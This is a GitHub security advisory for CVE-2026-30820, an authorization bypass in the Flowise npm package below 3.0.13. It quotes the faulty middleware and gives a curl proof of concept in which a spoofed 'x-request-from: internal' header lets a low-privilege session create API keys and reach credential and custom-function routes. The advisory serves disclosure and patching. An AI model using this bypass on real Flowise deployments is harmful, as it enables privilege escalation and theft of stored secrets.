# [H] Flowise has Authorization Bypass via Spoofed x-request-from Header

## Summary
Severity: High
Advisory: GHSA-wvhq-wp8g-c7vq
CVE: CVE-2026-30820
CWE: CWE-863
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-03-06
Source: https://github.com/advisories/GHSA-wvhq-wp8g-c7vq
Type: github-advisory

## Affected
- npm: `flowise` — affected >=0 <3.0.13

## Details
### Summary

Flowise trusts any HTTP client that sets the header `x-request-from: internal`, allowing an authenticated tenant session to bypass all `/api/v1/**` authorization checks. With only a browser cookie, a low-privilege tenant can invoke internal administration endpoints (API key management, credential stores, custom function execution, etc.), effectively escalating privileges.

### Details

The global middleware that guards `/api/v1` routes lives in `external/Flowise/packages/server/src/index.ts:214`. After filtering out the whitelist, the logic short-circuits on the spoofable header:

```javascript
if (isWhitelisted) {
    next();
} else if (req.headers['x-request-from'] === 'internal') {
    verifyToken(req, res, next);
} else {
    const { isValid } = await validateAPIKey(req);
    if (!isValid) return res.status(401).json({ error: 'Unauthorized Access' });
    … // owner context stitched from API key
}
```

Because the middle branch blindly calls verifyToken, any tenant that already has a UI session cookie is treated as an internal client simply by adding that header. No additional permission checks are performed before `next()` executes, so every downstream router under `/api/v1` becomes reachable.

### PoC

1. Log into Flowise 3.0.8 and capture cookies (e.g., `curl -c /tmp/flowise_cookies.txt … /api/v1/auth/login`).
2. Invoke an internal-only endpoint with the spoofed header:

```bash
    curl -sS -b /tmp/flowise_cookies.txt \
      -H 'Content-Type: application/json' \
      -H 'x-request-from: internal' \
      -X POST http://127.0.0.1:3100/api/v1/apikey \
      -d '{"keyName":"Bypass Demo"}'
```
    The server returns HTTP 200 and the newly created key object.
3. Remove the header and retry:

```bash
    curl -sS -b /tmp/flowise_cookies.txt \
      -H 'Content-Type: application/json' \
      -X POST http://127.0.0.1:3100/api/v1/apikey \
      -d '{"keyName":"Bypass Demo"}'
```
    This yields {"error":"Unauthorized Access"}, confirming the header alone controls access.

The same spoof grants access to other privileged routes like `/api/v1/credentials`, `/api/v1/tools`, `/api/v1/node-custom-function`, etc.

### Impact

This is an authorization bypass / privilege escalation. Any authenticated tenant (even without API keys or elevated roles) can execute internal administration APIs solely from the browser, enabling actions such as minting new API keys, harvesting stored secrets, and, when combined with other flaws (e.g., Custom Function RCE), full system compromise. All self-hosted Flowise 3.0.8 deployments that rely on the default middleware are affected.

## References
- https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-wvhq-wp8g-c7vq
- https://nvd.nist.gov/vuln/detail/CVE-2026-30820
- https://github.com/FlowiseAI/Flowise
- https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.0.13
